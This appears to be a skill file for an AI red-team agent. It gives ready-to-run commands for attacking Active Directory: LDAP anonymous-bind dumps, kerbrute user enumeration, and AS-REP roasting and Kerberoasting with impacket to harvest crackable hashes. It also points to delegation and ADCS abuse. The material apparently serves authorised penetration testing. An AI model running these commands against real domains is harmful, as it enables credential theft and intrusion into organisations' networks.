---
name: ldap-kerberos
description: Enumerate LDAP directories and abuse Kerberos (anonymous bind, AS-REP roasting, Kerberoasting, delegation)
origin: RedteamOpencode
---

# LDAP / Kerberos

## When to Activate

- Ports 389/636 (LDAP/LDAPS), 88 (Kerberos), 464 (kpasswd), 3268/3269 (Global Catalog)
- Domain controller / AD lab

## Tools

`run_tool nmap`, `ldapsearch`, `ldapdomaindump`, `kerbrute`, `impacket` (`GetNPUsers.py`,
`GetUserSPNs.py`), `nxc ldap`, Metasploit (exploit phase).

## Methodology

### 1. LDAP Anonymous Bind
```bash
run_tool ldapsearch -x -H ldap://HOST -s base namingcontexts
run_tool ldapsearch -x -H ldap://HOST -b 'DC=example,DC=com' '(objectClass=user)'
run_tool nmap -p 389 --script ldap-rootdse,ldap-search HOST
```
Anonymous/authenticated bind → dump users, groups, computers, GPOs:
```bash
run_tool ldapdomaindump -u 'DOMAIN\user' -p PASS HOST -o $DIR/scans/ldapdump
nxc ldap HOST -u USER -p PASS --users --groups --computers --pass-pol
```

### 2. Kerberos User Enumeration
```bash
run_tool kerbrute userenum -d DOMAIN --dc HOST users.txt
```
Valid usernames (no lockout) feed credential attacks.

### 3. AS-REP Roasting (no pre-auth accounts)
```bash
run_tool GetNPUsers.py DOMAIN/ -dc-ip HOST -usersfile users.txt -format hashcat -outputfile $DIR/scans/asrep.txt
```

### 4. Kerberoasting (SPN accounts)
```bash
run_tool GetUserSPNs.py DOMAIN/USER:PASS -dc-ip HOST -request -outputfile $DIR/scans/kerberoast.txt
```

### 5. Delegation / ACL / ADCS
- Unconstrained/constrained delegation, RBCD, genericAll/writeDacl edges.
- ADCS ESC1-ESC8 templates.

Save every hash/ticket to `$DIR/scans/` and `$DIR/auth.json`; record usernames in `intel.md`.

## References

`references/active-directory/ad-enumeration.md`, `references/active-directory/kerberos-attacks.md`,
`references/active-directory/adcs-attacks.md`, `references/active-directory/ad-persistence.md`.

## Confirm-Only Rule

Roasting/enumeration is confirm-stage. Cracking, relay, and lateral movement are owned by
`exploit-developer` (stage=vuln_confirmed). Report hashes + next action, do not brute force here.
